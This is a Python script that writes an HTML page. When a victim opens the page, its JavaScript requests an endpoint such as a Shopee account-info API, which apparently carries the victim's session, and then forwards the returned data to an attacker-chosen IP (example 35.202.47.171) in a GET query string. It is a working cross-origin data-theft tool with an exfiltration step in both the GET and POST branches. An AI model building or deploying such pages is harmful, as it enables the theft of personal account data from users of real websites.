import json

# Function to create HTML content based on user input
def create_html(ip, endpoint, method, data_type, data):
    # Check if method is POST and format the data for the correct content type
    if data_type == 'application/x-www-form-urlencoded':
        # Format the data for x-www-form-urlencoded
        formatted_data = '&'.join([f'{key}={value}' for key, value in data.items()])
    else:
        # For JSON, stringify the data
        formatted_data = json.dumps(data)  # Fix here: use json.dumps()

    # HTML Template
    html_template = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dynamic Request Test</title>
</head>
<body>
    <h1>Request Test</h1>
    <h3>Response will appear here:</h3>
    <pre id="response-data">Loading...</pre>
    <script>
        // Function to send the request based on input method (GET or POST)
        let requestData = {json.dumps(data)};
        let requestMethod = '{method}';
        let url = '{endpoint}';
        let ip = '{ip}';  // The IP to send the response to

        if (requestMethod === 'POST') {{
            fetch(url, {{
                method: 'POST',
                headers: {{
                    'Content-Type': '{data_type}'
                }},
                body: {formatted_data}
            }})
            .then(response => response.json())  // Parse the response as JSON
            .then(data => {{
                console.log("Response from server:", data);
                document.getElementById('response-data').textContent = JSON.stringify(data, null, 2);

                // Send the response to your server (35.202.47.171:8080)
                const params = new URLSearchParams();
                params.append('data', JSON.stringify(data));  // Send the response data as a parameter

                fetch('http://' + ip + ':8080/your-endpoint?' + params.toString(), {{
                    method: 'GET'
                }})
                .then(forwardResponse => forwardResponse.json())
                .then(forwardedData => {{
                    console.log("Forwarded response from your server:", forwardedData);
                }})
                .catch(forwardError => console.error('Error forwarding the data:', forwardError));
            }})
            .catch(error => console.error('Error:', error));
        }} else {{
            fetch(url + '?' + new URLSearchParams(requestData).toString(), {{
                method: 'GET',
            }})
            .then(response => response.json())  // Parse the response as JSON
            .then(data => {{
                console.log("Response from server:", data);
                document.getElementById('response-data').textContent = JSON.stringify(data, null, 2);

                // Send the response to your server (35.202.47.171:8080)
                const params = new URLSearchParams();
                params.append('data', JSON.stringify(data));  // Send the response data as a parameter

                fetch('http://' + ip + '/proxy?' + params.toString(), {{
                    method: 'GET'
                }})
                .then(forwardResponse => forwardResponse.json())
                .then(forwardedData => {{
                    console.log("Forwarded response from your server:", forwardedData);
                }})
                .catch(forwardError => console.error('Error forwarding the data:', forwardError));
            }})
            .catch(error => console.error('Error:', error));
        }}
    </script>
</body>
</html>
    """
    
    # Write the generated HTML content to a file
    with open("request_test.html", "w") as file:
        file.write(html_template)

# Get user input for IP, endpoint, method, and data
ip = input("Enter your IP to listen to response (e.g., 35.202.47.171): ")
endpoint = input("Enter the endpoint URL you want to test (e.g., https://shopee.com.my/api/v4/account/basic/get_account_info): ")
method = input("Enter the HTTP method (GET or POST): ").upper()
data_type = "application/json"  # Default to JSON for POST, can modify for form
data = {}

if method == "POST":
    data_type = input("Enter the Content-Type (application/x-www-form-urlencoded or application/json): ").strip()
    print("Enter the POST data (as a valid JSON object): ")
    data_input = input("Enter POST data in JSON format (e.g., {\"dummy\":\"test\"}): ")
    try:
        data = json.loads(data_input)
    except json.JSONDecodeError:
        print("Invalid JSON. Using empty data.")
        data = {}

# Create the HTML file based on the user input
create_html(ip, endpoint, method, data_type, data)

print("HTML file created: 'request_test.html'")

